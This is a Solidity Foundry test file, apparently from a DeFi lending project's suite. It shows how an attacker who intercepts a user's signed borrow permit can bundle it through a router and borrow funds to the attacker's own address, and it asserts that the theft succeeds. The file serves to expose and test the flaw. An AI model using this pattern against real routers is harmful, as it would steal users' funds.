// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/console.sol";
import {MockingSetup} from "../mocking/MockingSetup.sol";
import {ILendingProvider} from "../../src/interfaces/ILendingProvider.sol";
import {MockProvider} from "../../src/mocks/MockProvider.sol";
import {SimpleRouter} from "../../src/routers/SimpleRouter.sol";
import {IRouter} from "../../src/interfaces/IRouter.sol";
import {Routines} from "../utils/Routines.sol";
import {IWETH9} from "../../src/helpers/PeripheryPayments.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract AttackPermits is MockingSetup, Routines {
  address attacker;

  ILendingProvider public mockProvider;
  IRouter public simpleRouter;

  uint256 public constant DEPOSIT_AMOUNT = 1 ether;
  uint256 public constant BORROW_AMOUNT = 200e18;

  // These test prices should be inverse of each other.
  uint256 public constant USD_PER_ETH_PRICE = 2000e18;
  uint256 public constant ETH_PER_USD_PRICE = 5e14;

  function setUp() public {
    vm.label(CHARLIE, "attacker");
    attacker = CHARLIE;

    oracle.setPriceOf(collateralAsset, debtAsset, ETH_PER_USD_PRICE);
    oracle.setPriceOf(debtAsset, collateralAsset, USD_PER_ETH_PRICE);

    mockProvider = new MockProvider();
    ILendingProvider[] memory providers = new ILendingProvider[](1);
    providers[0] = mockProvider;

    _setVaultProviders(vault, providers);
    vault.setActiveProvider(mockProvider);

    simpleRouter = new SimpleRouter(IWETH9(collateralAsset), chief);

    do_depositAndBorrow(DEPOSIT_AMOUNT, BORROW_AMOUNT, vault, ALICE);
  }

  function test_PermitAttack() public {
    // Alice signs a message for `simpleRouter` to borrow 800 tDAI.
    uint256 newBorrowAmount = 800e18;

    (uint256 deadline, uint8 v, bytes32 r, bytes32 s) = _getPermitBorrowArgs(
      ALICE, ALICE_PK, address(simpleRouter), newBorrowAmount, 0, address(vault)
    );

    // Attacker "somehow" gets hold of this signed message and calls simpleRouter.

    IRouter.Action[] memory actions = new IRouter.Action[](2);

    actions[0] = IRouter.Action.PermitBorrow;
    actions[1] = IRouter.Action.Borrow;

    bytes[] memory args = new bytes[](2);

    args[0] =
      abi.encode(address(vault), ALICE, address(simpleRouter), newBorrowAmount, deadline, v, r, s);
    args[1] = abi.encode(address(vault), newBorrowAmount, attacker, ALICE);

    vm.prank(attacker);
    simpleRouter.xBundle(actions, args);

    assertEq(IERC20(debtAsset).balanceOf(attacker), newBorrowAmount);
  }
}
